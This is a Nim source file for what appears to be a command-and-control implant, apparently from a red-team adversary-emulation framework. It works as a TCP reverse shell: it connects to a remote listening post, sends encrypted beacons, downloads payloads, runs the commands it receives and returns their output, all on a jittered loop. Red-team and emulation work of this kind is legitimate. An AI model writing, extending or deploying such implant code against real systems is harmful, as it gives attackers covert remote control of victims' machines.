from contact import Beacon, Instruction, jitterSleep
from rawhttp import requestPayload
from ../commands/commands import CommandExecution, runCommand
from ../util/cryptic import toString, toByteSeq, encrypt, decrypt
from ../util/config import encryptionKey
from ../util/encoder import hexToSeqByte, seqByteToHex
import marshal
import net
import os
from sequtils import concat
import logging
import strutils
import strformat


var logger = newConsoleLogger()

proc bufferedSend(conn: Socket, beacon: Beacon) =
    ## Sends the agent beacon over a buffered socket.
    ## 
    # Marshall the beacon with Nim's fancy marshall operator.
    var data: string = $$beacon
    let encryptedData: seq[byte] = encrypt(data, encryptionKey)
    # Convert the encrypted binary data to a hex string.
    var encryptedDataHex: string = seqByteToHex(encryptedData)
    # Send the data to the socket discarding any error.
    discard trySend(conn, encryptedDataHex & "\n")

proc respond(conn: Socket, beacon: Beacon, message: string) =
    ## Sends the result of a command execution to the listening post.
    ##
    var newBeacon: Beacon = beacon
    var unmarshalledBeacon: Beacon = to[Beacon](toString(decrypt(hexToSeqByte(message.strip()), encryptionKey)))
    newBeacon.Links = @[]
    for link in unmarshalledBeacon.Links:
        if len(link.Payload) > 0:
            requestPayload(link.Payload)
        var response: CommandExecution = runCommand(executor = link.Executor, message = link.Request)
        var newLink = link
        newLink.Response = response.bites
        newLink.Status = response.status
        newLink.Pid = response.pid
        newBeacon.Links.add(newLink)
    newBeacon.Pwd = getCurrentDir()
    bufferedSend(conn, newBeacon)

proc listen(conn: Socket, beacon: Beacon) =
    ## TCP reverse shell. 
    ## 
    bufferedSend(conn, beacon)
    while true:
        try:
            var line: string = conn.recvLine()
            line = line.strip()
            respond(conn, beacon, line)
        except:
            break

proc tcpCommunicate*(address: string, sleep: int, beacon: Beacon) =
    ## Listens for Prelude beacons.
    ## 
    var host: string = address.split(":")[0]
    var port: int = parseInt(address.split(":")[1])
    while true:
        let client = newSocket()
        logger.log(lvlInfo, fmt"Connecting to {host} on port {port}")
        client.connect(host, Port(port))
        listen(client, beacon)
        # Sleep until the next beacon.
        jitterSleep(sleep, "TCP")
